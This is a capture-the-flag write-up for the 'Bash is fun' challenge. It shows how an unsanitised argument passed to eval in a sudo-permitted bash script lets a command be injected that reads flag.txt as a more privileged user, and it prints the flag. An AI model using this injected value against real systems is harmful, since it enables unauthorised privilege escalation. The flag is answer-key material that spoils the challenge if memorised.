# Bash is fun (Bash)

```
user1@716fe67c8d07:/home/user1$ ls -l
total 12
-rwxr----- 1 root user-privileged  67 Aug 29 19:08 flag.txt
-rwxr-xr-x 1 root user-privileged 565 Aug 29 19:08 welcome.sh
-rwxr-xr-x 1 root root             62 Aug 29 19:08 welcome.txt
```
We need to read `flag.txt`, but we have insufficient permissions. Interestingly, `flag.txt` and `welcome.sh` are under the group `user-privileged` instead of `root`.
```
user1@716fe67c8d07:/home/user1$ sudo -l
Matching Defaults entries for user1 on 716fe67c8d07:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on 716fe67c8d07:
    (user-privileged) NOPASSWD: /home/user1/welcome.sh
```
It seems like we can run `welcome.sh` as `user-privileged` without a password using `sudo`. Let's look at the contents of `welcome.sh`:
```bash
user1@716fe67c8d07:/home/user1$ cat welcome.sh
#!/bin/bash
name="greet"
while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
  -V | --version )
    echo "Beta version"
    exit
    ;;
  -n | --name )
    shift; name=$1
    ;;
  -u | --username )
    shift; username=$1
    ;;
  -p | --permission )
     permission=1
     ;;
esac; shift; done
if [[ "$1" == '--' ]]; then shift; fi

echo "Welcome To SysAdmin Welcomer \o/"

eval "function $name { sed 's/user/${username}/g' welcome.txt ; }"
export -f $name
isNew=0
if [[ $isNew -eq 1 ]];then
        $name
fi

if [[ $permission -eq 1 ]];then
        echo "You are: "
        id
fi
```
Given that we are running this script as `user-privileged`, if we read `flag.txt` in the script, it will work because we have sufficient privileges. Now all we need to do is figure out how to insert a read of `flag.txt`.

The `eval` command looks suspicious, especially with the variable `$name` being inserted as the function name. We can pass a string that ends the function definition, runs `cat flag.txt`, and starts another function definition to continue where we left off. For example, if we pass the string
```
hi { echo hi; }; cat flag.txt; function greet
```
as `$name`, then the code that will be evaluated is
```bash
function hi { echo hi; }; cat flag.txt; function greet { sed 's/user//g' welcome.txt ; }
```
Let's try running it.
```
user1@716fe67c8d07:/home/user1$ sudo -u user-privileged ./welcome.sh -n 'hi { echo hi; }; cat flag.txt; function greet'
Welcome To SysAdmin Welcomer \o/
FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}
/home/user1/welcome.sh: line 23: export: {: not a function
/home/user1/welcome.sh: line 23: export: echo: not a function
/home/user1/welcome.sh: line 23: export: hi;: not a function
/home/user1/welcome.sh: line 23: export: };: not a function
/home/user1/welcome.sh: line 23: export: cat: not a function
/home/user1/welcome.sh: line 23: export: flag.txt;: not a function
/home/user1/welcome.sh: line 23: export: function: not a function
```
There were a bunch of errors caused by the `export` statement on the next line, but we got the flag.
